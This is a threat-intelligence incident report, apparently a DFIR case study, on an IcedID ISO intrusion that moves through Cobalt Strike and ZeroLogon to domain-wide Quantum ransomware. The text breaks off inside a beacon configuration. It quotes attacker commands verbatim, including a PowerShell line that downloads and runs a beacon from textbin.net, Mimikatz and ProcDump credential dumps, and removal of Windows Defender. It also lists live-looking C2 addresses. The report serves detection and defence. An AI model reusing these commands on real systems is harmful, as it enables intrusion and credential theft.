@@ -1,0 +1,1174 @@
+Malicious ISO File Leads to Domain Wide Ransomware
+April 3, 2023
+IcedID continues to deliver malspam emails to facilitate a compromise. This case covers the activity from a campaign in late September of 2022. Post exploitation activities detail some familiar and some new techniques and tooling, which led to  domain wide ransomware.
+
+This case shares similarities of the IcedID campaign detailed by Malware-Traffic-Analysis.net, where the ADGet.exe application was referenced.
+
+Case Summary
+This intrusion began by the execution of IcedID malware contained within an ISO image. The ISO file was delivered to the victim as part of a malspam campaign. Delivering payloads using an ISO image is a common technique observed in several prior cases. This technique has grown in use as threat actors look to evade Mark-of-the-Web controls.
+
+The ISO image delivered a hidden directory containing a IcedID payload and a batch file. After being successfully mounted (double clicked), the end user only sees a malicious LNK file named documents inside the virtual hard drive. Clicking on the LNK file executes the batch file, which copies the IcedID payload to the user’s AppData\Local\Temp folder and loads it using rundll32. A scheduled task was created at that time to maintain persistence on this host as well.
+
+Upon the execution of the IcedID payload, discovery commands using Windows utilities such as net, nltest, and ipconfig were executed to discover domain trusts, domain admins, workstation configuration, etc. Around 16 hours after the initial execution, the first Cobalt Strike beacon DLL was executed from the IcedID malware. This led to another round of discovery using net followed by AdFind.
+
+The threat actor installed Atera and Splashtop remote access software via an MSI file. After that, the threat actors tried a GetSystem privilege escalation technique, which was blocked by antivirus. The threat actor then proceeded to exploit CVE-2020-1472 (ZeroLogon). This was followed by a batch script used to perform DNS lookups on hosts across the environment. After this, the threat actors began their first lateral movement to a server in the environment by copying their Cobalt Strike DLL over to the host and executing it via a remote service. They then repeated the install of the remote access software package.
+
+Some two hours later, another Cobalt Strike beacon was executed. With this beacon, the threat actors succeeded in elevating to SYSTEM on the beachhead host and proceeded to dump LSASS memory. Another round of activity took place using system tools, batch files, and Adget. Several more beacons were also loaded on the host using DLLs and PowerShell.
+
+At this point, the threat actors had the clear text credentials for one of the domain administrator accounts and began moving laterally to other systems. They issued remote commands using WMIC to conduct discovery, as well as distribute and execute Cobalt Strike beacons. These actions, however, failed to get a beacon to launch on the domain controller being targeted. After an hour or so of failures, the threat actors proceeded to RDP into the domain controller. Once there, they then loaded textbin[.]net, a pastebin style site, to download Cobalt Strike PowerShell code to the host in a file named pon.txt.
+
+Trying to execute this locally failed as well, and the threat actor moved on to downloading a variety of beacon executables (e.g. lsass.exe, lsasss.exe, etc.). These beacons, however, continued to crash and fail to run. Around an hour after starting the RDP session, the threat actors executed a PowerShell command to disable Windows Defender Antivirus on the host and reviewed Group Policy Objects for the domain. The Cobalt Strike beacons then began to execute successfully on the domain controller. Now, with Cobalt Strike beacons on the domain controller, the threat actors continued with discovery actions using Invoke-ShareFinder and other PowerShell and system utilities.
+
+A few hours after, the threat actors installed the RSAT tools onto the beachhead host. However, they appear to have been unfamiliar with the tools and called up the help menu before using Get-ADComputer to collect the details on hosts in the environment. Back on the domain controller, ProcDump was used to dump LSASS memory. The PowerShell command Get-EventLog was then used to collect logon events on all domain administrators in the network.
+
+The threat actors went quiet for around seven hours. When they returned, several more Cobalt Strike beacons were launched and several different Mimikatz implementations were executed on the domain controller, including a Mimikatz executable and a PowerShell implementation. For the next several hours, repeats of previous discovery actions and additional beacons executed using remote WMIC commands, were observed. During this time, Windows event logs point to the threat actors completing DCSync activities on one of the domain controllers. A new batch file, localdisk.bat, was also executed using remote WMI commands, to collect disk data on hosts around the environment. These discovery actions were completed several times again in other various batch files.
+
+On the start of the fourth day, the threat actors continued to repeat their previous discovery and beacon spreading activity. Near the end of the day, the threat actors moved to install AnyDesk on several servers including a backup management host, likely as a further means of persistence or later command and control. Next, the threat actor executed PowerShell to pop up an alert message on several hosts, letting the user know that the machine was infected with Cobalt Strike.
+
+After completing this activity, they used Rclone to exfiltrate copies of the backup files to the Mega.io cloud storage service. The threat actors then staged a ransomware binary on the backup server but did not immediately execute it.
+
+Around two hours after dropping the file, it was executed using a command line argument, which included a list of hosts to target. This appeared to fail. The threat actors then proceeded to execute the payload manually in several ways, across various hosts. Finally, they connected to a domain controller and dropped three scripts; one to copy the ransomware executable to all hosts, one to reset every users password in the organization, and a final one to execute the staged ransomware payload using PsExec.
+
+Once executed, the ransomware left the ransom note README_TO_DECRYPT.html, which informs the victim that Quantum ransomware is responsible for the intrusion. The time to ransomware was just over 78 hours from the initial IcedID infection. All domain joined systems were encrypted with Quantum ransomware.
+
+Services
+We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Metasploit, Empire, PoshC2, etc. More information on this service can be found here.
+
+Our All Intel service includes long term infrastructure tracking, clustering, C2 configs, and other curated intel, including non-public case data.
+
+If you are interested in hearing more about our services, or would like to talk about a free trial, please reach out to us using the Contact Us page. We look forward to hearing from you.
+
+Analysts
+Analysis and reporting completed by @_pete_0 and @MetallicHack.
+
+MITRE ATT&CK
+
+Initial Access
+This intrusion began by the execution of a malicious LNK embedded in an ISO file (masquerading as a folder). The ISO file was delivered as a ZIP archive via a malicious spam mail campaign.
+
+
+
+Malicious ISO file
+First, the user clicked on the ISO file, which created a new virtual hard drive disk. Such activity can be tracked with Event 12 from Microsoft-Windows-VHDMP/Operational.
+
+
+
+This ISO file contains a LNK named documents and a hidden directory named max containing a cobalt strike DLL beacon and a batch file.
+
+
+As we can see below using LECmd by Eric Zimmerman, the file documents.lnk points to max\eyewear.bat.
+
+
+
+As a consequence, when the victim clicked on the LNK file, it triggered the execution of the batch file eyewear.bat
+
+
+
+The batch file eyewear.bat then executed two commands:
+
+It first moved a DLL file named eyewear.dat, initially located in a hidden folder named max, to the user’s AppData\Local\Temp\ folder :
+
+C:\Windows\system32\cmd.exe /c D:\max\eyewear.bat
+	➝ xcopy  /s /i /e /h max\easygoing.dat C:\Users\[REDACTED]\AppData\Local\Temp\*
+Then, DLL was executed using rundll32.exe :
+
+C:\Windows\system32\cmd.exe /c D:\max\eyewear.bat
+	➝ rundll32 C:\Users\[REDACTED]\AppData\Local\Temp\easygoing.dat,#1
+Want to block ISOs from automatically mounting when double clicked? Check out Huntress’s recent writeup.
+
+Execution
+On the second day of the intrusion, the threat actors used the IcedID malware to drop a Cobalt Strike beacon and execut it using regsvr32.exe.
+
+
+
+After beginning to move laterally, the threat actors used many other execution techniques such as PowerShell and executables run from their interactive RDP session in addition to DLLs.
+
+
+
+
+
+A number of application crashes were observed across several compromised hosts. This activity was a result of the threat actors attempting to execute various dropped tools or beacons on the endpoint, triggering a Windows Error Reporting (WER) fault process.
+
+
+
+Application crashes are recorded in the Windows Application event log under Event ID 1000 and 1001.
+
+
+
+The NSA Cyber Windows Event Monitoring Guidance, has the following statement:
+
+Application crashes may warrant investigation to determine if the crash is malicious or benign.
+
+In this case, the threat actors attempted to rectify the issue by deploying new beacons, renaming executable files by either appending a double extension or adding extra characters to the filename (i.e. lsass.exe to lsasss.exe).
+
+Some of these crashes may have been in response to being detected by Microsoft Defender. These signatures were found in the logs on various hosts.
+
+HackTool:Win32/NamedPipeImpers.A
+TrojanDropper:PowerShell/Cobacis.B
+VirTool:MSIL/Menace.C!MTB
+
+
+There was evidence that that the Cobalt Strike aggressor script AnnoyKit was leveraged to launch Internet Explorer via a COM object.
+
+
+
+Decoded from Base64:
+
+
+
+The decoded PowerShell function is readable in the PowerShell logs:
+
+
+
+The PowerShell script used is publicly available, and can be found here, along with the CNA script.
+
+We were unable to ascertain the purpose of running this script or how it furthered the threat actor’s goals.
+
+Persistence
+IcedID created a DLL named Utucka.dll just after the initial execution.
+
+
+
+A scheduled task was then created using this same DLL.
+
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <URI>\{3A79715D-4FFB-50BE-8F3A-090CE7FB4097}</URI>
+  </RegistrationInfo>
+  <Triggers>
+    <TimeTrigger id="TimeTrigger">
+      <Repetition>
+        <Interval>PT1H</Interval>
+        <StopAtDurationEnd>false</StopAtDurationEnd>
+      </Repetition>
+      <StartBoundary>2012-01-01T12:00:00</StartBoundary>
+      <Enabled>true</Enabled>
+    </TimeTrigger>
+    <LogonTrigger id="LogonTrigger">
+      <Enabled>true</Enabled>
+      <UserId>[REDACTED]</UserId>
+    </LogonTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <RunLevel>HighestAvailable</RunLevel>
+      <UserId>[REDACTED]</UserId>
+      <LogonType>InteractiveToken</LogonType>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>false</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <Duration>PT10M</Duration>
+      <WaitTimeout>PT1H</WaitTimeout>
+      <StopOnIdleEnd>true</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>false</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>rundll32.exe</Command>
+      <Arguments>"C:\Users\[REDACTED]\AppData\Local\[REDACTED]\[REDACTED]\Utucka.dll",#1 --oxoj="CategoryBeyond\license.dat"</Arguments>
+    </Exec>
+  </Actions>
+</Task>
+First execution was observed on Day 1 at 8:00 PM and was repeated every hour.
+
+C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
+  ➝ rundll32.exe "C:\Users\[REDACTED]\AppData\Local\[REDACTED]\[REDACTED]\Utucka.dll",#1 --oxoj="CategoryBeyond\license.dat"
+Privilege Escalation
+Named pipe impersonation
+The named pipe impersonation technique was used multiple times on different hosts in order to get system privileges. This is a common technique used by threat actors, and implemented by the GetSystemCobalt Strike command. As seen in the screenshot below, GetSystem creates a service and connects to a pipe.
+
+
+
+cmd.exe /c echo nbproc > \\.\pipe\nbproc
+cmd.exe /c echo xgxfpw > \\.\pipe\xgxfpw
+cmd.exe /c echo ylfdup > \\.\pipe\ylfdup
+The beacon creates the named pipe (seen in Sysmon EventID 17) and impersonates the NT AUTHORITY\SYSTEM account used to connect to the pipe.
+
+
+
+The MITRE Cyber Analytics Repository (CAR) details the Get System elevation, CAR-2021-02-002: Get System Elevation
+
+Winlogon Token Impersonation/Theft
+Multiple access to WinLogon with granted access 0x40 (PROCESS_DUP_HANDLE) were performed. Such access can be tracked with Sysmon event ID 10 (ProcessAccess). As explained in this blog written by Jonathan JOHNSON, opening a handle to WinLogon in order to duplicate the token and call ImpersonateLoggedOnUser is a known Cobalt Strike technique.
+
+
+
+ZeroLogon
+
+
+On the second day of the intrusion, a spike in NetLogon traffic was observed from the beachhead host to a domain controller. This traffic then triggered several network signatures for CVE-2020-1472 otherwise known as ZeroLogon.
+
+ET EXPLOIT Possible Zerologon Phase 1/3 - NetrServerReqChallenge with 0x00 Client Challenge (CVE-2020-1472)
+ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate2 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M1
+ET EXPLOIT Zerologon Phase 3/3 - Malicious NetrServerPasswordSet2 (CVE-2020-1472)
+The event logs corroborated a successful exploitation with a password update Event 4742 for one of the Domain Controller passwords.
+
+
+
+Defense Evasion
+Mark-of-the-Web Bypass
+The threat actors delivered the initial malware as a zip file, with the contents of a ISO file, which contained their payload to gain access to the target environment. These packages are designed to evade controls such as Mark-of-the-Web restrictions.
+
+Windows Defender tampering
+On one host, the threat actors ran the following command to try and clear the way for their activity, likely due to the difficulty the threat actors were having with beacons crashing.
+
+powershell.exe Uninstall-WindowsFeature -Name Windows-Defender-GUI
+This command was downloaded from a remote site to a file named pon!.txt and then executed locally.
+
+
+
+Process injection
+Multiple suspicious calls to the function CreateRemoteThread (Sysmon Event ID 8) were observed. This is a known behavior of Cobalt Strike and its function shinject, which can be used to inject a new beacon or a specific program to another process on the victim’s computer.
+
+
+
+As a result, we observed abnormal winlogon.exe process behavior; winlogon.exe performed DNS requests (Sysmon event ID 22) to a Cobalt Strike C2 domain guteyutu[.]com.
+
+
+
+The injection is also visible from memory dumps. Several hosts showed rundll32 processes exhibiting common process injection behavior, where the MZ file header is seen in the starting memory address in rundll32 processes with PAGE_EXECUTE_READWRITE permissions.
+
+
+
+Many of these beacons could also be detected in memory scanning with the Malpedia Cobalt Strike rule. A sample of a scanning run is displayed below:
+
+Host	Process ID	Process Name	Command Line	Yara Rule
+SERVERA	568	winlogon.exe	winlogon.exe	win_cobalt_strike_auto
+SERVERA	4284	RuntimeBroker.exe	C:\Windows\System32\RuntimeBroker.exe -Embedding	win_cobalt_strike_auto
+SERVERB	9936	rundll32.exe	C:\Windows\syswow64\rundll32.exe	win_cobalt_strike_auto
+BEACHHEAD	996	svchost.exe	C:\Windows\system32\svchost.exe -k DcomLaunch -p -s LSM	win_cobalt_strike_auto
+BEACHHEAD	1888	svchost.exe	C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s AudioEndpointBuilder	win_cobalt_strike_auto
+BEACHHEAD	2220	winlogon.exe	winlogon.exe	win_cobalt_strike_auto
+BEACHHEAD	7032	rundll32.exe	C:\Windows\syswow64\rundll32.exe	win_cobalt_strike_auto
+SERVERC	3328	rundll32.exe	C:\Windows\syswow64\rundll32.exe	win_cobalt_strike_auto
+Credential Access
+Multiple tools and scripts were used to access and collect credentials from compromised hosts. There were several variants of Mimikatz in binary and PowerShell form:
+
+"C:\ProgramData\mimikatz.exe"
+"C:\ProgramData\mimikatz.exe.exe"
+"C:\ProgramData\mimikatz_cryptovanniy.exe"
+"C:\ProgramData\notepad.exe" "C:\ProgramData\katz.ps1
+Commands used to collect credentials and export to text files stored in the C:\ProgramData folder included the following:
+
+C:\Windows\system32\cmd.exe /C mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\programdata\mimikatz\creds.txt
+C:\Windows\system32\cmd.exe /C mimikatz.exe privilege::debug sekurlsa::logonPasswords full samdump::hashes exit > "c:\programdata\creds.txt"
+C:\Windows\system32\cmd.exe powershell -ep bypass -C "import-module .\katz.ps1;Invoke-Katz" > mimi.txt
+DCSync
+Credentials were also dumped via DCSync using two compromised high privilege accounts. The activity was observed in Windows Security Event ID 4662, with known indicators including non-computer based account, an access mask of 0x100, and object IDs.
+
+1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 - DS-Replication-Get-Changes-All
+1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 - DS-Replication-Get-Changes
+DCSync was observed across 12 events, with separate events for each object ID. It is likely the operator used the Cobalt Strike DCSync command, having observed them already enter this directly in the host OS command shell.
+
+
+
+For additional details, SpecterOps has an article covering the DCSync technique.
+
+Code injection in LSASS
+Multiple injections into the LSASS process were observed on multiple hosts.
+
+Threat actors used the function CreateRemoteThread in order to inject malicious code in LSASS process to access credentials.
+
+
+
+Process dump of the LSASS process was undertaken using the Sysinternals ProcDump utility:
+
+
+
+This process was invoked by RunDLL32.exe which was an injected Cobalt Strike beacon reaching out to the command and control server at 111.90.143[.]191.
+
+C:\Windows\SysWOW64\rundll32.exe
+  ➝ c:\windows\temp\procdump64.exe -accepteula -ma lsass.exe fwtsqmfile00.dmp
+Discovery
+Classic ransomware discovery stages
+A number of familiar discovery techniques were utilized using various OS commands to discover information relating to the user, host, and network configuration. Standard time discovery, domain trust discovery, workstation configuration discovery, and use of the net command to discover standard accounts and groups were observed.
+
+From the IcedID malware running via Rundll32, the following LOLBAS commands were observed:
+
+rundll32 C:\Users\[REDACTED]\AppData\Local\Temp\easygoing.dat,#1
+	➝ nltest /domain_trusts /all_trusts
+	➝ nltest /domain_trusts
+	➝ net view /all /domain
+	➝ net view /all
+	➝ net group "Domain Admins" /domain
+	➝ cmd.exe /c chcp >&2 	
+	➝ ipconfig /all 	
+	➝ net config workstation
+    ➝ systeminfo
+From Nigu.exe (Cobalt Strike beacon), the following LOLBAS commands were observed:
+
+"C:\Users\[REDACTED]\AppData\Local\Temp\Nigu.exe" 
+	➝ C:\Windows\system32\cmd.exe /C net group "domain admins" /domain	
+	➝ C:\Windows\system32\cmd.exe /C net group "enterprise admins" /domain	
+	➝ C:\Windows\system32\cmd.exe /C net time	
+	➝ C:\Windows\system32\cmd.exe /C net user [REDACTED] /domain
+Discovery commands observed from other Cobalt Strike beacons using LOLBAS included:
+
+systeminfo
+netstat -anop tcp
+cmd.exe /C echo %%temp%%
+cmd.exe /C hostname
+cmd.exe /C nslookup hostname
+RSAT installation to enumerate domain computers properties
+Following the first discovery stage, the threat actor installed RSAT (Remote Server Administration Tools) on the beachhead host, which contains the ActiveDirectory PowerShell Module.
+
+rundll32.exe
+	➝ C:\Windows\system32\cmd.exe /C powershell.exe Add-WindowsCapability –online –Name “Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0”
+    ➝ C:\Windows\system32\cmd.exe /C powershell.exe Import-Module ActiveDirectory
+One interesting fact to notice, the threat actors had to consult the help menu of Get-ADComputer and Export-CSV using Get-Help.
+
+rundll32.exe
+    ➝ C:\Windows\system32\cmd.exe /C powershell.exe Get-Help Export-CSV
+	➝ C:\Windows\system32\cmd.exe /C powershell.exe Get-Help Get-ADComputer
+Domain computers’ properties were then enumerated using the Get-ADComputer. PowerShell cmdlet and names were exported in a CSV file named ADComputers.csv.
+
+	➝ C:\Windows\system32\cmd.exe /C powershell.exe Get-ADComputer -Filter * -Properties * | Export-CSV "C:\ProgramData\ADComputers.csv" -NoTypeInformation
+	➝ C:\Windows\system32\cmd.exe /C powershell.exe Get-ADComputer -Filter * -Properties * | Export-CSV -Path "C:\ProgramData\ADComputers.csv" -NoTypeInformation
+	➝ C:\Windows\system32\cmd.exe /C powershell.exe Get-ADComputer -Filter * -Properties * | Export-csv C:\ProgramData\ADComputers.csv -NoTypeInformation
+	➝ C:\Windows\system32\cmd.exe /C powershell.exe Get-ADComputer -Identity [REDACTED] -Properties *
+	
+	➝ C:\Windows\system32\cmd.exe /C powershell.exe get-ADcomputer -Filter * | Where-Object {$a=$_.name; $_.DistinguishedName -ne "CN=$a,OU=[REDACTED],DC=[REDACTED],DC=[REDACTED]"} | Sort-Object name | Select-Object name | Export-csv C:\ProgramData\ADComputers.csv -NoTypeInformation
+In addition, threat actors searched for Active Directory related DLLs in other directories:
+
+C:\Windows\system32\cmd.exe /C dir /s *file/ Microsoft.ActiveDirectory.Management.dll
+C:\Windows\system32\cmd.exe /C where /r C:\Windows\WinSxS\ *Microsoft.ActiveDirectory.Management.dll*
+Hands on keyboard!
+We observed mistakes made by the threat actors during hands-on keyboard activities, these included typos and incorrect use of commands. An example of an incorrect named command was nslook up (should have been nslookup) that also incorrectly passed the username, instead of the host name.
+
+C:\Windows\system32\cmd.exe /C nslook up [REDACTED]
+C:\Windows\system32\cmd.exe /C nslookup USERFirstName UserLastName
+Another example, the misspelling of administrators:
+
+net group administartors /domain
+Further examples included typos of commands:
+
+C:\Windows\system32\cmd.exe /C net ttime
+Other operator errors observed included the use of Cobalt Strike commands being passed as a parameter instead of a beacon task.
+
+
+
+The use of DCSync is documented in a previous TheDFIRReport titled ‘Cobalt Strike, a Defender’s Guide
+
+During AD enumeration, the operator made use of the PowerShell Get-help cmdlet to troubleshoot the following:
+
+powershell.exe Get-Help Export-CSV
+powershell.exe Get-Help Get-ADComputer
+Two file sharing web sites were used to access files, these were dropmefiles[.]com and file[.]io. Both of these services were accessed on day two from one Domain Controller on the network, with file downloads relating to tooling/scripts. On day three, a second Domain Controller was observed accessing the dropmefiles[.]com domain.
+
+Reviewing the WebCacheV01.dat on the domain controllers, reveals more details on the sites loaded, including the files that where downloaded from those sites:
+
+
+
+
+
+
+
+The threat actors downloaded the lsass.exe beacon from their attacker hosted infrastructure at 199.127.60[.]117.
+
+In addition, the threat actors also used Internet Explorer on the domain controller to search Bing.
+
+
+
+This is quite unusual to search directly on the victim’s browser. The current search results point to how to change the hidden view attribute in file explorer in reference to the ProgramData folder.
+
+
+
+Share discovery with Invoke-ShareFinder
+Other tools observed in use, included Invoke-ShareFinder, this is a common tool that we frequently encountered in cases for enumerating network shares and identifying data and potential targets. We have a detailed report covering Invoke-ShareFinder. In this case, there is a clear indication that the operator launched the Invoke-ShareFinder command via Cobalt Strike, as observed in Event ID 800:
+
+
+
+Windows Security Logs discovery
+Once the threat actors had achieved privilege escalation by compromising administrator accounts, an unusual, but interesting discovery technique was observed as seen below.
+
+
+
+C:\Windows\system32\cmd.exe /C powershell -c "get-eventlog 'Security' | where {$_.Message -like '*<REDACTED>*' -AND 'Source Network Address'} | export-csv c:\windows\temp\events_<REDACTED>.txt"
+Executing this query would return all events in the Security log that references the specified account and with a source network address. Events returned would include process creation, logins, etc.
+
+Its likely that this discovery technique forms an extension of T1033 – System Owner/User Discovery, where the threat actor was leveraging this data source to understand the account pattern of life, any indicators from compromise, and to potentially blend in adversary activities.
+
+Base64 for the win
+Other discovery activities observed included a domain host discovery script via PowerShell. This was double base64 encoded.
+
+
+
+Decoding this revealed another PowerShell Base64 encoded string:
+
+
+
+The -e is short for -EncodedCommand. The base64 encoding starts with JAB that is a common pattern for UTF-16 starting with $. Refer to the Base64 cheatsheet by Forian Roth here.
+
+There are many different variations of EncodedCommand, with shorthand and aliases available. Unit42 (PaloAlto) provides a good article on trends and observations of PowerShell encoded commands:
+
+Decoding this again using CyberChef shows the resulting PowerShell script:
+
+
+
+More tools dropped by threat actors
+Other binaries and scripts were dropped onto one endpoint:
+
+
+
+The ns.bat file contained thousands of nslookup commands with a corresponding hostname from the network, with output appended to a ns.txt file.
+
+
+
+ADGet
+An Active Directory collection tool named ADGet was dropped into a user’s temp folder and executed with an output filename argument. No file meta data is provided. Its a simple to use tool, the application is invoked from the command line and passes an output file name to save enumerated AD objects.
+
+
+
+ADGet is an uncommon tool, however, its function is very similar to ADfind–the key difference is that LDAP queries are not passed, they are instead coded into the binary itself.
+
+
+
+The AD objects will be enumerated generating a zip output file containing the following TSV (tab separated files) files if using a default configuration:
+
+
+
+These files can be viewed with any editor or reader that supports CSV or TSV.
+
+AdFind
+While Adget was seen used, prior to that tool being run the threat actors also deployed the tried and true AdFind, which was renamed to find.exe and called using find.bat.
+
+
+
+Another batch file named AD.bat was dropped into the ProgramData folder on one host and used adfind to enumerate AD objects.
+
+
+
+The AD.bat file had the following commands:
+
+for /f "delims=" %%A in ('dir /s /b %WINDIR%\system32\*htable.xsl') do set "var=%%A"
+adfind.exe -f (objectcategory=person) > ad_users.txt
+adfind.exe -f objectcategory=computer > ad_computers.txt
+adfind.exe -f objectcategory=computer -csv name operatingSystem > ad_computers_enum.txt
+adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt
+adfind.exe -subnets -f (objectCategory=subnet) > ad_subnets.txt
+adfind.exe -f "(objectcategory=group)" > ad_group.txt
+adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt
+Interestingly, the first line in the batch file denotes the WMI output configuration in HTML form (from XSL file c:\windows\system32\wbem\en-US\htable.xsl). The HTML was never used. Its likely the code was reused from other open source pentest enumerations scripts available, such as:
+
+
+
+Automated enumeration script
+ 
+WMIC
+The use of WMIC was leveraged by a batch file named dS.bat that queried a number of target hosts to determine the host disk drive configuration. This can be useful to determine drives, including mounted network shares.
+
+wmic /node:<REDACTED> /user:"<REDACTED>" /password:"<REDACTED>" logicaldisk get caption,description,drivetype,providername,volumename
+The dS.bat file was executed by the injected Rundll32.exe process.
+
+
+
+During hands-on discovery by the threat actors, the Group Policy was viewed by the Microsoft Management Console application to view Domain Group Policy Objects.
+
+
+
+This can provide useful information concerning any restrictions or configuration settings for hosts on the network.
+
+Lateral Movement
+WMI
+Threat actors used wmic.exe in order to execute PowerShell Cobalt Strike beacons on multiple workstations and servers. The payloads were stored on textbin[.]net.
+
+
+
+As we can see above, WmiPrvSe.exe (WMI Provider Host) executed the PowerShell Cobalt Strike beacon on the remote computers.
+
+
+
+Remote Desktop Protocol
+The beacon C:\ProgramData\lsass.exe was used to proxy RDP connections and connect to another computer.
+
+
+
+Proxying RDP traffic via a process such as a Cobalt Strike beacon reduces the exposure of the threat actor’s own infrastructure, and blends RDP activity to those of internal hosts on the network.
+
+The use of RDP was extensively used throughout the intrusion, using a variety of processes (beacon injected or standalone).
+
+
+
+The common processes observed were two injected processes, and the Nigu.exe/lsass.exe.
+
+
+
+These processes are unusual for establishing RDP connections. During these RDP sessions, the threat actors often opened Internet Explorer to download their beacons or commands they wanted to run on lateral hosts. An example would be pon.txt. This file was opened during their RDP session and contained the PowerShell commands used to launch a new beacon:
+
+"C:\Windows\system32\NOTEPAD.EXE" C:\Users\REDACTED\Downloads\pon.txt
+pon.txt contents:
+
+powershell iex((new-object net.webclient).downloadstring('https://textbin.net/raw/ls1jhefawt'))
+Remote Service
+Remote services were also created in order to propagate Cobalt Strike beacons in the network.
+
+
+
+AnyDesk
+AnyDesk was used to move laterally between a workstation and a backup server as shown below with Sysmon event 3 (Network connection):
+
+
+
+Collection
+To achieve collection of various directories on multiple hosts, the threat actors used the dir command through the administrative share c$ and redirected the output to a file text named listing.txt.
+
+C:\Windows\System32\cmd.exe /C dir \\[REDACTED HOST]\c$\users >> listing.txt
+In addition, multiple text files were also created to store the output of various discovery commands and scripts.
+
+C:\ProgramData\qwe3.txt
+C:\Users\[REDACTED USER]\Downloads\sns.txt
+C:\Windows\Temp\events_Administrator.text
+C:\Windows\Temp\events_[REDACTED USER].text
+C:\Windows\Temp\listing.txt
+C:\Windows\Temp\ns.txt
+C:\Windows\Temp\nsserv.txt
+Command and Control
+IcedID
+The malware configuration:
+
+Configuration details: 
+{“Campaign ID”: 2220668032 ,“C2 url”: “alockajilly.com”}
+Initially the IcedID malware made a connection to 64.227.12[.]180:80 for it’s first call back. This aligns with the domain present in the malware configuration details.
+
+
+
+
+After the first call over an unencrypted port, command and control traffic moved over to TLS on port 443. Connections were made to various IP’s over the length of the intrusion, but two made up the majority of the traffic.
+
+destination.ip	destination.port	tls.client.ja3	tls.server.ja3s	zeek.ssl.server.name	Count
+5.196.103.145	443	a0e9f5d64349fb13191bc781f81f42e1	ec74a5c51106f0419184d0dd08fb05bc	choifejuce[.]lol	373
+5.196.103.145	443	a0e9f5d64349fb13191bc781f81f42e1	ec74a5c51106f0419184d0dd08fb05bc	erinindiaka[.]quest	1
+46.101.19.119	443	a0e9f5d64349fb13191bc781f81f42e1	ec74a5c51106f0419184d0dd08fb05bc	opiransiuera[.]com	278
+178.128.85.30	443	a0e9f5d64349fb13191bc781f81f42e1	ec74a5c51106f0419184d0dd08fb05bc	zoomersoidfor[.]com	4
+5.252.177.10	443	a0e9f5d64349fb13191bc781f81f42e1	ec74a5c51106f0419184d0dd08fb05bc	considerf[.]info	1
+66.63.188.70	443	a0e9f5d64349fb13191bc781f81f42e1	ec74a5c51106f0419184d0dd08fb05bc	antiflamez[.]bar	1
+155.138.159.45	443	a0e9f5d64349fb13191bc781f81f42e1	ec74a5c51106f0419184d0dd08fb05bc	www[.]onlinecloud[.]cloud	1
+IcedID C2 beaconing over the intrusion:
+
+
+
+Cobalt Strike
+There were a number of beacons deployed across the environment, over 70 pipes were created. The beacons used recognizable default Cobalt Strike configurations and attempted to masquerade dropped files as legitimate Microsoft Windows executables. For example, on one host, we could observe over 20 pipes being created, in a pattern of postex_xxxx or MSSE-xxxx-server.
+
+
+
+When beacons were deployed within the environment, there was a significant increase in outbound network connections to C2 servers. For example, a beacon injected into a single Rundll32.exe process generated over 10K connections in a three hour window, consistently across two days.
+
+
+
+The threat actors deployed various beacons over the course of the intrusion using different methods including executables, DLLs, and PowerShell beacons.
+
+
+
+Over the length of the intrusion four different Cobalt Strike servers were observed in use. Some lasted the majority of the intrusion while others only lasted a few days.
+
+
+
+Cobalt Strike SSL characteristics:
+
+destination.ip	destination.port	tls.client.ja3	tls.client.ja3s	zeek.ssl.server.name
+172.93.181.165	443	a0e9f5d64349fb13191bc781f81f42e1	ae4edc6faf64d08308082ad26be60767	fazehotafa[.]com
+45.66.151.109	443	a0e9f5d64349fb13191bc781f81f42e1	ae4edc6faf64d08308082ad26be60767	guteyutur[.]com
+111.90.143.191	443	72a589da586844d7f0818ce684948eea	ae4edc6faf64d08308082ad26be60767	–
+78.128.112.139	443	72a589da586844d7f0818ce684948eea	f176ba63b4d68e576b5ba345bec2c7b7	–
+Analysis of the Nigu.exe binary indicated use of compression and PE loading characteristics, typically observed for Cobalt Strike payload beacon. Using CAPA, the results listed the following capabilities:
+
+
+
+Embedded within the binary were strings such as: “inflate 1.2.11 Copyright 1995-2017 Mark Adler”. Once the file was unpacked and the Cobalt Strike beacon binary carved, the Cobalt Strike configuration could be determined as follows:
+
+{
+  "beacontype": [
+    "HTTPS"
+  ],
+  "sleeptime": 5000,
+  "jitter": 28,
+  "maxgetsize": 1865903,
+  "spawnto": "AAAAAAAAAAAAAAAAAAAAAA==",
+  "license_id": 0,
+  "cfg_caution": false,
+  "kill_date": null,
+  "server": {
+    "hostname": "fazehotafa.com",
+    "port": 443,
